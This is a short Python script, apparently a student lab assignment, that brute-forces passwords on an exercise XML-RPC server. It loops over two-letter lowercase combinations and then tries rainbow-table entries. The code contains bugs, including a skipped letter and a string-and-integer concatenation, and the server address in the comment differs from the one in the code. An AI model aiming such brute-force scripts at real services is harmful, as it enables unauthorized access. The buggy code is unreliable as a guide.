#There is a web server running at 188.138.32.138 at port 8080. Your assignment is to break into it.
import xmlrpc.client
import rainbow

s = xmlrpc.client.ServerProxy('http://128.39.145.79:8080')
success = ''
def hack_easy():
    # iterate over all possible combinationas of ascii lower case letter representations. AKA bruteforce
    for i in range(97, 122):
        for x in range(97, 122):
            print(chr(i), chr(x))
            success = s.hack_easy(i, x, "Gruppe 4")
            if (success == "success"):
                print("Passowrd is: " + i + x)
                break
            if (success == 'success'):
                break

def hack_hard():
    for x in rainbow.rainbowtable:
        success = s.hack_hard(rainbow.rainbowtable[x], "Gruppe 4")
        if (success == "success"):
            print("Passowrd is: " + rainbow.rainbowtable[x])
            break


hack_easy()
hack_hard()


